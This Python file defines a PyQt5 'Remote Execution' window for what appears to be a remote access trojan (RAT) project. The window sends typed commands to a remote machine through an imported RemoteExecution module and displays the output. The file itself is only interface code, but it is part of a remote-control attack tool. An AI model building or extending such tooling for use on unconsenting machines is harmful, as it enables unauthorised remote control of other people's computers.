import sys
from PyQt5.QtGui import QTextCursor
from PyQt5.QtWidgets import QTextEdit, QLineEdit, QPushButton, QVBoxLayout, QHBoxLayout


from RATFunction.RemoteExecution import RemoteExecution
from RATFunction.RATFunctionUI import RATFunctionUI

#RemoteExecutionUI
class RemoteExecutionUI(RATFunctionUI):
    def __init__(self, function: RemoteExecution):
        super().__init__(function)
        self.command_function = function
        self.command_function.received_command_callback = self.received_command_callback
        self.setWindowTitle('Remote Execution')

        self.result_widget = QTextEdit()
        self.result_widget.setReadOnly(True)

        self.input_widget = QLineEdit()
        self.input_widget.returnPressed.connect(self.execute_command)

        self.send_button = QPushButton('Send Command', self)
        self.send_button.clicked.connect(self.execute_command)

        layout = QVBoxLayout()
        layout.addWidget(self.result_widget)

        input_layout = QHBoxLayout()
        input_layout.addWidget(self.input_widget)
        input_layout.addWidget(self.send_button)

        layout.addLayout(input_layout)
        self.setLayout(layout)

        self.setMinimumSize(400, 100)



    def received_command_callback(self, output: str, is_err: bool):
        if is_err:
            self.add_str(output)
        else:
            self.add_str(output)



    def add_str(self, string):
        self.result_widget.setPlainText(string)

    def execute_command(self):
        command = self.input_widget.text()
        self.command_function.send_command(command)
        self.input_widget.clear()